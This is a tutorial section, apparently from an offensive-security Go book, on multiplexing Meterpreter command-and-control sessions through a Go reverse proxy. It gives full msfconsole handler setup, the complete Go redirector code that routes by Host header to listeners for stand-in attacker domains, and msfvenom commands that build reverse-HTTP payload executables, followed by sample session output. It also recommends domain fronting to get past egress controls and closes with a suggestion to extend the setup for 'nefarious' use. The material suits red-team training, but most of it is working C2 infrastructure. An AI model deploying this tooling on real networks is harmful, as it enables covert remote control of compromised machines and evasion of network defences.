## Multiplexing Command-And-Control
You’ve arrived at the last section of the chapter on HTTP servers. Here, you’ll look at how to multiplex Meterpreter 
HTTP connections to different backend control servers. `Meterpreter` is a popular, flexible command-and-control (C2) 
suite within the `Metasploit exploitation framework`. We won’t go into too many details about Metasploit or Meterpreter. 
If you’re new to it, we recommend reading through one of the many tutorial or documentation sites.

Recommendation about Metasploit and Meterpreter fundamentals:
  - https://www.offensive-security.com/metasploit-unleashed/metasploit-fundamentals/
  - https://www.tutorialspoint.com/metasploit/index.htm

In this section, we’ll walk through creating a reverse HTTP proxy in Go so that you can dynamically route your incoming 
Meterpreter sessions based on the Host HTTP header, which is how virtual website hosting works. However, instead of 
serving different local files and directories, you’ll proxy the connection to different Meterpreter listeners. This is 
an interesting use case for a few reasons.

First, your proxy acts as a redirector, allowing you to expose only that domain name and IP address without exposing 
your Metasploit listeners. If the redirector ever gets blacklisted, you can simply move it without having to move 
your C2 server. Second, you can extend the concepts here to perform [domain fronting](https://digi.ninja/blog/domain_fronting.php), 
a technique for leveraging trusted third-party domains (often from cloud providers) to bypass restrictive egress controls. 
We won’t go into a full-fledged example here, but we highly recommend you dig into it, as it can be pretty powerful, 
allowing you to egress restricted networks. Lastly, the use case demonstrates how you can share a single host/port 
combination among a team of allies potentially attacking different target organizations. Since ports 80 and 443 are 
the most likely allowed egress ports, you can use your proxy to listen on those ports and intelligently route the 
connections to the correct listener.

Here’s the plan. You’ll set up two separate Meterpreter reverse HTTP listeners. In this example, these will reside 
on a virtual machine with an IP address of `127.0.0.1` in that example, but they could very well exist on separate 
hosts. You’ll bind your listeners to ports `10080` and `20080`, respectively. In a real situation, these listeners 
can be running anywhere so long as the proxy can reach those ports. Make sure you have Metasploit installed (it 
comes pre-installed on Kali Linux); then start your listeners.
```shell script
   $ msfconsole
   > use exploit/multi/handler
   > set payload linux/x86/meterpreter_reverse_http
❶ > set LHOST 127.0.0.1
   > set LPORT 80
❷ > set ReverseListenerBindAddress 127.0.0.1
   > set ReverseListenerBindPort 10080
   > exploit -j -z
   [*] Exploit running as background job 1.

   [*] Started HTTP reverse handler on http://127.0.0.1:10080
```

When you start your listener, you supply the proxy data as the `LHOST` and `LPORT` values ❶. However, you set the 
advanced options `ReverseListenerBindAddress` and ReverseListenerBindPort to the actual IP and port on which you 
want the listener to start ❷. This gives you some flexibility in port usage while allowing you to explicitly 
identify the proxy host—which may be a hostname, for example, if you were setting up `domain fronting`.

On a second instance of Metasploit, you’ll do something similar to start an additional listener on port 20080. The only 
real difference here is that you’re binding to a different port:
```shell script
$ msfconsole
> use exploit/multi/handler
> set payload windows/meterpreter_reverse_http
> set LHOST 127.0.0.1
> set LPORT 80
> set ReverseListenerBindAddress 127.0.0.1
> set ReverseListenerBindPort 20080
> exploit -j -z
[*] Exploit running as background job 1.

[*] Started HTTP reverse handler on http://127.0.0.1:20080
```

Now, let’s create your reverse proxy. [main.go](main.go) shows the code in its entirety.
```go
   package main

   import (
       "log"
       "net/http"
    ❶ "net/http/httputil"
       "net/url"
       "github.com/gorilla/mux"
   )

❷ var (
       hostProxy = make(map[string]string)
       proxies   = make(map[string]*httputil.ReverseProxy)
   )

   func init() {
   	    // in that example we are using 127.0.0.1 for both but you can modify if needed
   	❸ hostProxy["attacker1.com"] = "http://127.0.0.1:10080"
    	hostProxy["attacker2.com"] = "http://127.0.0.1:20080"
    
       for k, v := range hostProxy {
        ❹ remote, err := url.Parse(v)
           if err != nil {
               log.Fatal("Unable to parse proxy target")
           }  
        ❺ proxies[k] = httputil.NewSingleHostReverseProxy(remote)
       }  
   }

   func main() {
       r := mux.NewRouter()
       for host, proxy := range proxies {
        ❻ r.Host(host).Handler(proxy)
       }
        // in that example we are using 127.0.0.1 for both but you can modify if needed
       log.Fatal(http.ListenAndServe("127.0.0.1:80", r))
   }
```

First off, you’ll notice that you’re importing the `net/http/httputil` package ❶, which contains functionality to 
assist with creating a reverse proxy. It’ll save you from having to create one from scratch.

After you import your packages, you define a pair of variables ❷. Both variables are maps. You’ll use the first, 
`hostProxy`, to map hostnames to the URL of the Metasploit listener to which you’ll want that hostname to route. 
Remember, you’ll be routing based on the `Host header` that your proxy receives in the HTTP request. Maintaining 
this mapping is a simple way to determine destinations.

The second variable you define, `proxies`, will also use hostnames as its key values. However, their corresponding 
values in the map are `*httputil.ReverseProxy` instances. That is, the values will be actual proxy instances to 
which you can route, rather than string representations of the destination.

Notice that you’re hardcoding this information, which isn’t the most elegant way to manage your configuration and 
proxy data. A better implementation would store this information in an external configuration file instead. We’ll 
leave that as an exercise for you. Or you can get that information as command line argument from user.

You use an `init()` function to define the mappings between domain names and destination Metasploit instances ❸. 
In this case, you’ll route any request with a Host header value of attacker1.com to http://127.0.0.1:10080 and 
anything with a Host header value of attacker2.com to http://127.0.0.1:20080. Of course, you aren’t actually 
doing the routing yet; you’re just creating your rudimentary configuration. Notice that the destinations correspond 
to the `ReverseListenerBindAddress` and `ReverseListenerBindPort` values you used for your Meterpreter listeners 
earlier.

Next, still within your `init()` function, you loop over your hostProxy map, parsing the destination addresses to 
create `net.URL` instances ❹. You use the result of this as input into a call to `httputil.NewSingleHostReverseProxy(net.URL)` ❺, 
which is a helper function that creates a reverse proxy from a URL. Even better, the `httputil.ReverseProxy` type 
satisfies the `http.Handler` interface, which means you can use the created proxy instances as handlers for your 
router. You do this within your `main()` function. You create a router and then loop over all of your proxy 
instances. Recall that the key is the hostname, and the value is of type `httputil.ReverseProxy`. For each key/value 
pair in your map, you add a matching function onto your router ❻. The Gorilla MUX toolkit’s `Route` type contains a 
matching function named Host that accepts a hostname to match Host header values in incoming requests against. For 
each hostname you want to inspect, you tell the router to use the corresponding proxy. It’s a surprisingly easy 
solution to what could otherwise be a complicated problem.

Your program finishes by starting the server, binding it to port 80. Save and run the program. You’ll need to do 
so as a privileged user since you’re binding to a privileged port.

At this point, you have two Meterpreter reverse HTTP listeners running, and you should have a reverse proxy running 
now as well. The last step is to generate test payloads to check that your proxy works. Let’s use `msfvenom, a payload 
generation tool that ships with Metasploit`, to generate a pair of Windows executable files:
```shell script
$ msfvenom -p linux/x86/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=80 HttpHostHeader=attacker1.com -f elf -o payload1.elf
$ msfvenom -p linux/x86/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=80 HttpHostHeader=attacker2.com -f elf -o payload2.elf
```

> **NOTE**  
> For more information about creating Metasploit payloads, please refer to [this link](https://netsec.ws/?p=331).

This generates two output files named `payload1.elf` and `payload2.elf`. Notice that the only difference between 
the two, besides the output filename, is the `HttpHostHeader` values. This ensures that the resulting payload 
sends its HTTP requests with a specific Host header value. Also of note is that the LHOST and LPORT values correspond 
to your reverse proxy information and not your Meterpreter listeners. Transfer the resulting executables to a 
Linux system or virtual machine. When you execute the files, you should see two new sessions established: one on the 
listener bound to port 10080, and one on the listener bound to port 20080. They should look something like this:

```shell script
>
[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk) Redirecting stageless
connection from /pxS_2gL43lv34_birNgRHgL4AJ3A9w3i9FXG3Ne2-3UdLhACr8-Qt6QOlOw
PTkzww3NEptWTOan2rLo5RT42eOdhYykyPYQy8dq3Bq3Mi2TaAEB with UA 'Mozilla/5.0 (Windows NT 6.1;
Trident/7.0;
rv:11.0) like Gecko'
[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk) Attaching
orphaned/stageless session...
[*] Meterpreter session 1 opened (10.0.1.20:10080 -> 10.0.1.20:60226) at 2020-07-03 16:13:34 -0500
```

If you use tcpdump or Wireshark to inspect network traffic destined for port 10080 or 20080, you should see that 
your reverse proxy is the only host communicating with the Metasploit listener. You can also confirm that the Host 
header is set appropriately to attacker1.com (for the listener on port 10080) and attacker2.com (for the listener 
on port 20080).

> **IMPROVEMENT SUGGESTION**  
> That’s it. You’ve done it! Now, take it up a notch. As an exercise for you, we recommend you update the code to 
> use a staged payload. This likely comes with additional challenges, as you’ll need to ensure that both stages 
> are properly routed through the proxy. Further, try to implement it by using HTTPS instead of cleartext HTTP. 
> This will further your understanding and effectiveness at proxying traffic in useful, nefarious ways.

> **SUMMARY**  
> You’ve completed your journey of HTTP, working through both client and server implementations over the last 
> two chapters. In the next chapter, you’ll focus on DNS, an equally useful protocol for security practitioners. 
> In fact, you’ll come close to replicating this HTTP multiplexing example using DNS.